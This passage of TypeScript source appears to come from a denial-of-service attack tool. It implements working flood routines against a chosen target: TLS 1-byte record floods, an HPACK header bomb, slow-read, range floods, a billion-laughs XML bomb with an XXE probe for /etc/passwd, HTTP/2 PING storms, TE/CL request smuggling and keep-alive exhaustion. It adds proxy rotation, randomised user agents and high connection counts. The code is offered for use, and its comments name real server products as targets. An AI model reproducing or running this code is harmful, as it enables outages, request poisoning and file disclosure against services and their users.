        openConns = Math.max(0, openConns - 1);
        resolve();
      };
      sock.on("error",   onEnd);
      sock.on("close",   onEnd);
      sock.on("timeout", () => { try { sock.destroy(); } catch { /**/ } });
    });
  };

  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneSlot();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 100 + Math.random() * 200));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SSL DEATH RECORD
//
//  After TLS handshake, writes application data one byte at a time.
//  Node's TLS stack creates a separate TLS record per write(), forcing
//  the server to AES-GCM decrypt + MAC-verify each 1-byte record.
//  200 connections × 100 records/sec = 20,000 decrypt ops/sec on server.
//  Works against TLS 1.2 AND TLS 1.3. Saturates server crypto threads.
// ─────────────────────────────────────────────────────────────────────────
async function runSSLDeathRecord(
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number, c: number) => void,
  proxies:      ProxyConfig[] = [],
): Promise<void> {
  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 50) : Math.min(threads, 1000); // 32GB: 1K SSL-death slots
  const RATE_MS   = 10; // 100 records/sec per slot

  let openConns = 0, pIdx = 0;
  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes, openConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const oneSlot = async (): Promise<void> => {
    if (signal.aborted) return;
    const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort);
    sock.setTimeout(60_000);
    return new Promise<void>(resolve => {
      let settled = false;
      const done = () => { if (!settled) { settled = true; openConns = Math.max(0, openConns - 1); resolve(); } };

      sock.once("secureConnect", () => {
        openConns++;
        // Partial HTTP/1.1 request sent as 1-byte TLS records → forces slow reassembly
        const req = `GET / HTTP/1.1\r\nHost: ${hostname}\r\nConnection: keep-alive\r\n`;
        let pos = 0;
        const iv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { clearInterval(iv); done(); return; }
          const byte = pos < req.length
            ? Buffer.from([req.charCodeAt(pos++)])
            : Buffer.from([Math.random() * 256 | 0]);
          try {
            sock.write(byte);
            localPkts++;
            localBytes += 22; // 1 payload + 5 TLS hdr + 16 AES-GCM tag (server cost)
          } catch { clearInterval(iv); done(); }
        }, RATE_MS);
        signal.addEventListener("abort", () => { clearInterval(iv); sock.destroy(); done(); }, { once: true });
      });

      sock.on("data",    () => {});
      sock.on("error",   () => { done(); });
      sock.on("close",   () => { done(); });
      sock.on("timeout", () => { sock.destroy(); done(); });
    });
  };

  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneSlot();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 150));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HPACK BOMB — HTTP/2 dynamic table exhaustion
//
//  Sends HEADERS frames packed with 50–150 unique custom headers, each
//  carrying the "Literal Header Field with Incremental Indexing" flag
//  (HPACK type 0x40 — RFC 7541 §6.2.1). This forces the server to:
//    1. Parse each header name + value pair
//    2. Compute a hash / compare against its HPACK dynamic table
//    3. Insert the new entry (evicting oldest when table exceeds maxSize)
//
//  The server's HPACK dynamic table is bounded (default 64KB). As we
//  send hundreds of headers per stream, the server continuously adds
//  new entries and evicts old ones — a tight allocator + GC cycle per
//  stream, per connection. Unlike the CONTINUATION flood (CVE-2024-27316)
//  this targets *properly patched* servers — there is no fix because
//  HPACK incremental indexing is a required protocol feature.
//
//  Effect: 500 connections × 200 streams/sec × 100 headers = 10M HPACK
//  table operations/sec on server CPU. Effective against nginx, h2o,
//  Envoy, Cloudflare Workers, AWS ALB, Caddy.
// ─────────────────────────────────────────────────────────────────────────
async function runHPACKBomb(
  resolvedHost: string,
  hostname:    string,
  targetPort:  number,
  threads:     number,
  signal:      AbortSignal,
  onStats:     (p: number, b: number) => void,
  proxies:     ProxyConfig[] = [],
): Promise<void> {
  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 80) : Math.min(threads, 1500); // 32GB: 1.5K HPACK bomb connections

  // Raw H2 frame builder (identical layout to h2-continuation)
  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
    const f = Buffer.allocUnsafe(9 + payload.length);
    f[0] = (payload.length >>> 16) & 0xff;
    f[1] = (payload.length >>>  8) & 0xff;
    f[2] = (payload.length       ) & 0xff;
    f[3] = type; f[4] = flags;
    f.writeUInt32BE(streamId & 0x7fffffff, 5);
    payload.copy(f, 9);
    return f;
  };

  const PREFACE  = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  const SETTINGS = mkFrame(0x04, 0x00, 0, Buffer.alloc(0));
  const SACK     = mkFrame(0x04, 0x01, 0, Buffer.alloc(0));

  // HPACK 7-bit integer string encoding without Huffman (length prefix + raw bytes)
  const hpackStr = (s: Buffer): Buffer => {
    const len = s.length;
    if (len < 128) return Buffer.concat([Buffer.from([len]), s]);
    // Multi-byte length encoding for strings 128–255 bytes
    return Buffer.concat([Buffer.from([0x7f, len - 127]), s]);
  };

  // Literal Header Field with Incremental Indexing — New Name (RFC 7541 §6.2.1, type=0x40)
  // MUST be added to server's dynamic HPACK table → eviction storm when table fills
  const makeBombHeader = (): Buffer => {
    const nameLen  = randInt(4,  22);
    const valueLen = randInt(12, 80);
    const name  = Buffer.allocUnsafe(nameLen);
    const value = Buffer.allocUnsafe(valueLen);
    for (let i = 0; i < nameLen;  i++) name[i]  = 0x61 + randInt(0, 26); // lowercase a-z only
    for (let i = 0; i < valueLen; i++) value[i]  = 0x21 + randInt(0, 94); // printable ASCII
    return Buffer.concat([Buffer.from([0x40]), hpackStr(name), hpackStr(value)]);
  };

  // Build HEADERS frame with Chrome pseudo-headers + N bomb headers (END_HEADERS|END_STREAM)
  const authBuf       = Buffer.from(hostname);
  const staticPseudo  = Buffer.concat([
    Buffer.from([0x82, 0x84, 0x87]),  // :method=GET, :path=/, :scheme=https (indexed)
    Buffer.from([0x41]),              // :authority — Literal Incremental, static name idx 1
    hpackStr(authBuf),
  ]);

  const makeHPACKBombFrame = (streamId: number): Buffer => {
    const bombHdrs = Buffer.concat(
      Array.from({ length: randInt(50, 150) }, () => makeBombHeader())
    );
    return mkFrame(0x01, 0x05, streamId, Buffer.concat([staticPseudo, bombHdrs]));
    // 0x01=HEADERS  0x05=END_HEADERS|END_STREAM
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);
  let pIdx = 0;

  const oneHpack = async (): Promise<void> => {
    if (signal.aborted) return;
    const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
    sock.setTimeout(30_000);
    return new Promise<void>(resolve => {
    let settled = false;
    const done  = () => { if (!settled) { settled = true; resolve(); } };

    // Backpressure-aware write: HPACK bomb frames are large (up to 1.2MB each);
    // writing without checking backpressure causes OOM via unbounded buffer growth.
    // IMPORTANT: also resolves on socket close/error so the promise never leaks.
    const safeWrite = (buf: Buffer): Promise<void> => {
      if (sock.destroyed) return Promise.resolve();
      const ok = sock.write(buf);
      if (ok) return Promise.resolve();
      return new Promise<void>(r => {
        if (sock.destroyed) { r(); return; }
        const cleanup = () => { sock.off("drain", cleanup); sock.off("error", cleanup); sock.off("close", cleanup); r(); };
        sock.once("drain", cleanup);
        sock.once("error", cleanup);
        sock.once("close", cleanup);
      });
    };

    sock.once("secureConnect", () => {
      sock.write(Buffer.concat([PREFACE, SETTINGS, SACK]));
      localPkts++; localBytes += PREFACE.length + 18;

      let streamId = 1;

      // Async attack loop: write one HPACK bomb frame per iteration with backpressure.
      // Each frame contains 50-150 huge literal headers → forces server to expand HPACK
      // dynamic table and allocate memory for each header value (BOMB_VAL_SIZE bytes each).
      const attack = async (): Promise<void> => {
        while (!signal.aborted && !sock.destroyed) {
          if (streamId > 0x7fffff00) { sock.destroy(); done(); return; }
          const frame = makeHPACKBombFrame(streamId);
          await safeWrite(frame); // wait for drain if kernel buffer full
          localPkts++; localBytes += frame.length;
          streamId += 2; // client-initiated streams use odd IDs
          await new Promise<void>(r => setImmediate(r)); // yield to event loop
        }
        done();
      };
      attack().catch(() => done());
    });

    sock.on("data",    () => {});  // drain server responses (SETTINGS ACK, RST, etc.)
    sock.on("timeout", () => { sock.destroy(); done(); });
    sock.on("error",   () => { done(); });
    sock.on("close",   () => { done(); });
    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
    }); // end inner Promise
  }; // end oneHpack

  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneHpack();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, runSlot));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SLOW READ — TCP slow-read attack
//
//  Establishes real HTTP/HTTPS connections, sends a valid request, then
//  pauses reading (socket.pause()). The server's TCP send buffer fills up
//  and the server's send thread/goroutine stays blocked indefinitely.
//  Extremely effective against Apache, Tomcat, IIS.
//  (Nginxlimits this to ~60s via proxy_read_timeout, but still consumes slots.)
// ─────────────────────────────────────────────────────────────────────────
async function runSlowRead(
  resolvedHost: string, hostname: string, targetPort: number, threads: number,
  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  const isHttps = targetPort === 443;
  let localPkts = 0, localBytes = 0, conns = 0;
  const flush   = () => { onStats(localPkts, localBytes, conns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const oneConn = (): Promise<void> => new Promise<void>((resolve) => {
    if (signal.aborted) { resolve(); return; }
    const sock: net.Socket = isHttps
      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
      : net.createConnection({ host: resolvedHost, port: targetPort });
    sock.setNoDelay(true);
    let settled = false;
    let readIv: NodeJS.Timeout | null = null;
    let holdTimer: NodeJS.Timeout | null = null;
    const done = () => {
      if (settled) return; settled = true;
      conns = Math.max(0, conns - 1);
      if (readIv)   { clearInterval(readIv);   readIv   = null; }
      if (holdTimer){ clearTimeout(holdTimer);  holdTimer = null; }
      try { sock.destroy(); } catch { /**/ }
      resolve();
    };
    const onConn = () => {
      conns++;
      localPkts++;
      // Complete request — so server starts sending response and fills its buffer
      const req = [
        `GET ${hotPath()}?_=${randStr(8)} HTTP/1.1`,
        `Host: ${hostname}`,
        `User-Agent: ${randUA()}`,
        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/avif,*/*;q=0.8`,
        `Accept-Encoding: gzip, deflate, br, zstd`,
        `Accept-Language: en-US,en;q=0.9`,
        `Connection: keep-alive`,
        `\r\n`,
      ].join("\r\n");
      sock.write(req);
      localBytes += req.length;
      // Pause reading immediately — server's send buffer fills and it blocks
      sock.pause();
      // Drip-read 1 byte every 600ms to prevent server FIN while still blocking
      readIv = setInterval(() => {
        if (signal.aborted || sock.destroyed) { done(); return; }
        try {
          const chunk = sock.read(1);
          if (chunk) { localBytes += 1; }
        } catch { done(); }
      }, 600);
      // Hold the connection for up to 90s before cycling
      holdTimer = setTimeout(done, 90_000);
    };
    if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
    else          sock.once("connect", onConn);
    sock.on("error",   done);
    sock.on("close",   done);
    sock.setTimeout(120_000);
    sock.on("timeout", done);
    signal.addEventListener("abort", done, { once: true });
  });

  const runSlot = async () => {
    while (!signal.aborted) {
      await oneConn();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 30));
    }
  };
  await Promise.all(Array.from({ length: Math.max(20, threads) }, runSlot));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP RANGE FLOOD — multi-range request exhaustion
//
//  HTTP Range: bytes=0-0,1-1,...,499-499 forces server to:
//  1. Validate ALL ranges against the resource (disk/memory seek × 500)
//  2. Build a multipart/byteranges response with 500 parts
//  3. Each part adds its own MIME headers (CPU + memory)
//  Effective against: nginx, Apache, CDN edge servers with byte-serving.
// ─────────────────────────────────────────────────────────────────────────
async function runRangeFlood(
  base: string, threads: number, signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // Multiple range variants — different sizes stress different server codepaths
  const RANGES = [
    Array.from({ length: 500 }, (_, i) => `${i}-${i}`).join(","),   // 500 × 1-byte
    Array.from({ length: 200 }, (_, i) => `${i*3}-${i*3+2}`).join(","), // 200 × 3-byte
    Array.from({ length: 100 }, (_, i) => `${i*5}-${i*5+4}`).join(","), // 100 × 5-byte
    "0-0,1000-1001,2000-2001,3000-3001,4000-4001,5000-5001,6000-6001,7000-7001,8000-8001,9000-9001",
  ];

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doReq = async () => {
    if (signal.aborted) return;
    try {
      const range = RANGES[randInt(0, RANGES.length)];
      const hdrs  = buildHeaders(false);
      hdrs["Range"]    = `bytes=${range}`;
      hdrs["If-Range"] = new Date(Date.now() - randInt(3600_000, 86400_000)).toUTCString();
      const res = await fetch(buildUrl(base), {
        headers: hdrs,
        signal:  AbortSignal.timeout(5000),
      });
      localPkts++;
      localBytes += parseInt(res.headers.get("content-length") || "0") || 1024;
      await res.body?.cancel();
    } catch {
      localPkts++; localBytes += 150;
    }
  };

  const runSlot = async () => { while (!signal.aborted) { await doReq(); } };
  await Promise.all(Array.from({ length: Math.max(60, threads) }, runSlot));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  XML BOMB / XXE DoS — XML entity expansion exhaustion
//
//  POST billion-laughs-lite payload to XML/SOAP/XMLRPC endpoints.
//  If the server parses XML without entity limits, the parser will expand
//  &d; → 16^3 × 64 = 262KB per entity × recursion = GB of memory/CPU.
//  Hits: xmlrpc.php, SOAP endpoints, XML REST APIs, OData.
// ─────────────────────────────────────────────────────────────────────────
async function runXMLBomb(
  base: string, threads: number, signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // Billion-laughs lite — 4 levels of entity expansion
  const XML_BOMB = `<?xml version="1.0"?>\n<!DOCTYPE lolz [\n  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">\n  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">\n  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">\n]>\n<root><data>&d;&d;&d;&d;</data></root>`;

  // SOAP variant with XXE probe
  const SOAP_BOMB = `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n<soapenv:Header/>\n<soapenv:Body><data>&xxe;</data></soapenv:Body>\n</soapenv:Envelope>`;

  const XML_ENDPOINTS = [
    "/xmlrpc.php", "/api/xml", "/soap", "/webservice", "/api/soap",
    "/services/soap", "/ws", "/api/ws", "/xmlrpc", "/rpc", "/api",
    "/api/v1", "/api/v2", "/WS", "/Service.asmx", "/WebService.asmx",
    "/?wsdl", "/axis2/services", "/OData/", "/odata/",
  ];

  const hName = (() => { try { return new URL(base).hostname; } catch { return base; } })();
  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doReq = async () => {
    if (signal.aborted) return;
    const payload  = Math.random() < 0.7 ? XML_BOMB : SOAP_BOMB;
    const isSoap   = payload === SOAP_BOMB;
    const endpoint = XML_ENDPOINTS[randInt(0, XML_ENDPOINTS.length)];
    try {
      const res = await fetch(new URL(endpoint, base).toString(), {
        method:  "POST",
        headers: {
          ...buildHeaders(true, payload.length),
          "Content-Type":  isSoap ? "text/xml; charset=utf-8" : "application/xml",
          "SOAPAction":    `"http://${hName}/service"`,
          "Content-Length": String(payload.length),
        },
        body:   payload,
        signal: AbortSignal.timeout(4000),
      });
      localPkts++;
      localBytes += payload.length;
      await res.body?.cancel();
    } catch {
      localPkts++; localBytes += payload.length;
    }
  };

  const runSlot = async () => { while (!signal.aborted) { await doReq(); } };
  await Promise.all(Array.from({ length: Math.max(40, threads) }, runSlot));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP/2 PING STORM — PING frame exhaustion
//
//  Every HTTP/2 PING frame MUST be ACK'd by the server (RFC 7540 §6.7).
//  Sending thousands of PINGs per second forces the server to:
//  1. Parse each PING frame (context switch per frame)
//  2. Allocate a PING ACK frame response
//  3. Write the ACK to the connection's write queue
//  Results in massive CPU + network overhead per connection.
// ─────────────────────────────────────────────────────────────────────────
async function runH2PingStorm(
  resolvedHost: string, hostname: string, targetPort: number, threads: number,
  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  // H2 PING frame: 9-byte header + 8-byte opaque data = 17 bytes
  // Prelude: client connection preface + SETTINGS frame
  const H2_CLIENT_PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  // SETTINGS frame (type=0x4, flags=0x0, stream=0, no params)
  const H2_SETTINGS       = Buffer.from([0,0,0, 4, 0, 0,0,0,0]);
  // SETTINGS ACK (type=0x4, flags=0x1, stream=0, no payload)
  const H2_SETTINGS_ACK   = Buffer.from([0,0,0, 4, 1, 0,0,0,0]);

  function buildPing(opaque?: Buffer): Buffer {
    const frame = Buffer.allocUnsafe(17);
    frame.writeUInt32BE(0x00000008, 0); // length=8, type=6 (PING)
    frame[3] = 0x06;                    // type=PING
    frame[4] = 0x00;                    // flags=0 (not ACK — forces server to ACK)
    frame.writeUInt32BE(0, 5);          // stream id=0
    if (opaque) opaque.copy(frame, 9);
    else        (opaque = Buffer.allocUnsafe(8), opaque.fill(Math.random() * 255 | 0), opaque.copy(frame, 9));
    return frame;
  }

  // Pre-build 256 PING frames with random opaque data for fast cycling
  const PING_POOL = Array.from({ length: 256 }, () => buildPing());

  let localPkts = 0, localBytes = 0, localConns = 0;
  const flush   = () => { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const onePingConn = (): Promise<void> => new Promise<void>((resolve) => {
    if (signal.aborted) { resolve(); return; }
    const sock: tls.TLSSocket | net.Socket = targetPort === 443
      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false, ALPNProtocols: ["h2"] })
      : net.createConnection({ host: resolvedHost, port: targetPort });
    let settled = false;
    let pingIv: NodeJS.Timeout | null = null;
    const done = () => {
      if (settled) return; settled = true;
      if (pingIv) { clearInterval(pingIv); pingIv = null; }
      localConns = Math.max(0, localConns - 1);
      try { sock.destroy(); } catch { /**/ }
      resolve();
    };
    const startPinging = () => {
      localConns++;
      // Send preface + initial SETTINGS
      sock.write(Buffer.concat([H2_CLIENT_PREFACE, H2_SETTINGS, H2_SETTINGS_ACK]));
      localPkts++;
      localBytes += H2_CLIENT_PREFACE.length + H2_SETTINGS.length + H2_SETTINGS_ACK.length;
      // Blast PING frames as fast as possible
      pingIv = setInterval(() => {
        if (signal.aborted || sock.destroyed) { done(); return; }
        // Send 50 PINGs per interval burst
        for (let i = 0; i < 50; i++) {
          const ping = PING_POOL[randInt(0, PING_POOL.length)];
          sock.write(ping);
          localPkts++;
          localBytes += 17;
        }
      }, 5); // 50 PINGs × 200/s = 10,000 PINGs/s per connection
      // Cycle connection every 30s
      setTimeout(done, 30_000);
    };
    if (sock instanceof tls.TLSSocket) sock.once("secureConnect", startPinging);
    else                                sock.once("connect", startPinging);
    sock.on("error", done);
    sock.on("close", done);
    sock.setTimeout(35_000);
    sock.on("timeout", done);
    signal.addEventListener("abort", done, { once: true });
  });

  const runSlot = async () => {
    while (!signal.aborted) {
      await onePingConn();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 20));
    }
  };
  await Promise.all(Array.from({ length: Math.max(30, threads) }, runSlot));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP REQUEST SMUGGLING — TE/CL desync
//
//  Sends requests with both Transfer-Encoding: chunked and Content-Length
//  that disagree, exploiting HA/load-balancer parsing inconsistencies.
//  Front-end sees CL=6, back-end sees chunked — "GPOST" prefix leaks into
//  the next victim's request, poisoning the request queue.
//  (RFC 7230 §3.3.3: if both present, TE wins — but many servers disagree)
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPSmuggling(
  resolvedHost: string, hostname: string, targetPort: number, threads: number,
  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  const isHttps = targetPort === 443;

  // CL.TE variant: front-end uses Content-Length (sees 6 bytes), back-end uses TE (sees full body)
  // The "GPOST" prefix poisons the next queued request on the back-end connection.
  const buildSmuggle = () => {
    const path = hotPath();
    const poison = `GET /admin HTTP/1.1\r\nHost: ${hostname}\r\nContent-Length: 0\r\n\r\n`;
    const chunk = poison.length.toString(16);
    // CL.TE: Content-Length disagrees with chunked encoding
    return [
      `POST ${path} HTTP/1.1\r\n`,
      `Host: ${hostname}\r\n`,
      `User-Agent: ${randUA()}\r\n`,
      `Content-Type: application/x-www-form-urlencoded\r\n`,
      `Content-Length: ${String(poison.length + chunk.length + 5)}\r\n`,
      `Transfer-Encoding: chunked\r\n`,
      `Connection: keep-alive\r\n`,
      `\r\n`,
      `${chunk}\r\n${poison}\r\n`,
      `0\r\n\r\n`,
    ].join("");
  };

  // TE.CL variant: front-end uses TE (sees 0-length body), back-end uses CL (sees leftover data)
  const buildSmuggleTE = () => {
    const path = hotPath();
    const poison = `SMUGGLED / HTTP/1.1\r\nHost: ${hostname}\r\nContent-Length: 0\r\n\r\n`;
    return [
      `POST ${path} HTTP/1.1\r\n`,
      `Host: ${hostname}\r\n`,
      `User-Agent: ${randUA()}\r\n`,
      `Content-Length: ${poison.length + 4}\r\n`,
      `Transfer-Encoding:\x20chunked\r\n`,  // space trick for obfuscation
      `Connection: keep-alive\r\n`,
      `\r\n`,
      `0\r\n\r\n`,
      poison,
    ].join("");
  };

  let localPkts = 0, localBytes = 0, localConns = 0;
  const flush   = () => { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const oneConn = (): Promise<void> => new Promise<void>((resolve) => {
    if (signal.aborted) { resolve(); return; }
    const sock: net.Socket = isHttps
      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
      : net.createConnection({ host: resolvedHost, port: targetPort });
    sock.setNoDelay(true);
    let settled = false;
    const done = () => {
      if (settled) return; settled = true;
      localConns = Math.max(0, localConns - 1);
      try { sock.destroy(); } catch { /**/ }
      resolve();
    };
    const onConn = () => {
      localConns++;
      // Send multiple smuggle variants in one keep-alive connection
      for (let i = 0; i < 8; i++) {
        const pkt = Math.random() < 0.5 ? buildSmuggle() : buildSmuggleTE();
        sock.write(pkt);
        localPkts++;
        localBytes += pkt.length;
      }
      setTimeout(done, randInt(2000, 5000));
    };
    if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
    else          sock.once("connect", onConn);
    sock.on("data",    () => { localBytes += 100; });
    sock.on("error",   done);
    sock.on("close",   done);
    sock.setTimeout(8000);
    sock.on("timeout", done);
    signal.addEventListener("abort", done, { once: true });
  });

  const runSlot = async () => {
    while (!signal.aborted) {
      await oneConn();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 20));
    }
  };
  await Promise.all(Array.from({ length: Math.max(30, threads) }, runSlot));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  DNS OVER HTTPS (DoH) FLOOD — /dns-query endpoint exhaustion
//
//  Floods DNS-over-HTTPS endpoint with random DNS queries.
//  Forces resolver to perform recursive DNS lookups for random domains,
//  exhausting DNS resolver thread pool + upstream DNS bandwidth.
//  Effective against: Cloudflare DoH, servers with nginx-dns-module,
//  any server running a DNS resolver (1.1.1.1, 8.8.8.8 proxy, etc.)
// ─────────────────────────────────────────────────────────────────────────
async function runDoHFlood(
  base: string, threads: number, signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const DOH_PATHS = [
    "/dns-query", "/resolve", "/dns", "/dns-query?type=A",
    "/api/doh", "/.well-known/dns", "/dns-over-https",
  ];

  // Build a real DNS wire-format query for a random subdomain
  const buildDNSQuery = (domain: string): Buffer => {
    const labels = domain.split(".");
    const qname  = Buffer.alloc(labels.reduce((a, l) => a + l.length + 1, 0) + 1);
    let off = 0;
    for (const label of labels) {
      qname[off++] = label.length;
      qname.write(label, off);
      off += label.length;
    }
    qname[off] = 0; // root
    const header = Buffer.from([
      randInt(0, 0xFF), randInt(0, 0xFF), // ID
      0x01, 0x00, // Flags: RD=1
      0x00, 0x01, // QDCOUNT=1
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // ANCOUNT/NSCOUNT/ARCOUNT = 0
    ]);
    const question = Buffer.concat([qname, Buffer.from([0,1, 0,1])]); // QTYPE=A, QCLASS=IN
    return Buffer.concat([header, question]);
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doReq = async () => {
    if (signal.aborted) return;
    const domain  = `${randStr(randInt(6,12))}.${randStr(randInt(4,8))}.${["com","net","org","io","co"][randInt(0,5)]}`;
    const dnsWire = buildDNSQuery(domain);
    const path    = DOH_PATHS[randInt(0, DOH_PATHS.length)];
    try {
      // RFC 8484 DoH: application/dns-message wire format
      const res = await fetch(new URL(path, base).toString(), {
        method:  "POST",
        headers: {
          "Content-Type":  "application/dns-message",
          "Accept":        "application/dns-message",
          "User-Agent":    randUA(),
          "Cache-Control": "no-cache",
        },
        body:   dnsWire,
        signal: AbortSignal.timeout(3000),
      });
      localPkts++;
      localBytes += dnsWire.length + (parseInt(res.headers.get("content-length") || "0") || 100);
      await res.body?.cancel();
    } catch {
      localPkts++; localBytes += dnsWire.length;
    }
  };

  const runSlot = async () => { while (!signal.aborted) { await doReq(); } };
  await Promise.all(Array.from({ length: Math.max(50, threads) }, runSlot));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  KEEPALIVE EXHAUST — HTTP/1.1 persistent connection exhaustion
//
//  Opens keep-alive connections and pipelines 128 requests per connection
//  in a burst without waiting for responses. Server must process all queued
//  requests before closing. Combined with large POST bodies, this saturates
//  the server's keep-alive connection pool (MaxKeepAliveRequests limit).
// ─────────────────────────────────────────────────────────────────────────
async function runKeepaliveExhaust(
  resolvedHost: string, hostname: string, targetPort: number, threads: number,
  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  const isHttps = targetPort === 443;
  const PIPELINE_DEPTH = 128; // requests per connection

  let localPkts = 0, localBytes = 0, conns = 0;
  const flush   = () => { onStats(localPkts, localBytes, conns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const buildKeepalivePipeline = (depth: number): string => {
    const reqs: string[] = [];
    for (let i = 0; i < depth; i++) {
      const isPost = Math.random() < 0.3;
      const body   = isPost ? buildBody(10, 40) : "";
      const method = isPost ? "POST" : (Math.random() < 0.7 ? "GET" : "HEAD");
      const hdrs   = [
        `${method} ${hotPath()}?_=${randStr(6)}&v=${randInt(0,99999)} HTTP/1.1`,
        `Host: ${hostname}`,
        `User-Agent: ${randUA()}`,
        `Accept: */*`,
        `Accept-Encoding: gzip, deflate, br`,
        `Connection: keep-alive`,
        isPost ? `Content-Type: application/x-www-form-urlencoded` : "",
        isPost ? `Content-Length: ${body.length}` : "",
        ``,
        body,
      ].filter(l => l !== "").join("\r\n");
      reqs.push(hdrs);
    }
    return reqs.join("\r\n") + "\r\n";
  };

  const oneConn = (): Promise<void> => new Promise<void>((resolve) => {
    if (signal.aborted) { resolve(); return; }
    const sock: net.Socket = isHttps
      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
      : net.createConnection({ host: resolvedHost, port: targetPort });
    sock.setNoDelay(true);
    let settled = false;
    const done = () => {
      if (settled) return; settled = true;
      conns = Math.max(0, conns - 1);
      try { sock.destroy(); } catch { /**/ }
      resolve();
    };
    const onConn = () => {
      conns++;
      const pipeline = buildKeepalivePipeline(PIPELINE_DEPTH);
      sock.write(pipeline);
      localPkts  += PIPELINE_DEPTH;
      localBytes += pipeline.length;
      // Read responses slowly — keep the connection alive
      sock.resume();
      setTimeout(done, randInt(15_000, 30_000));
    };
    if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
    else          sock.once("connect", onConn);
    sock.on("data",    () => { localBytes += 200; });
    sock.on("error",   done);
    sock.on("close",   done);
    sock.setTimeout(35_000);
    sock.on("timeout", done);
    signal.addEventListener("abort", done, { once: true });
  });

  const runSlot = async () => {
    while (!signal.aborted) {
      await oneConn();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 15));
    }
  };
  await Promise.all(Array.from({ length: Math.max(20, threads) }, runSlot));
  clearInterval(flushIv); flush();
}

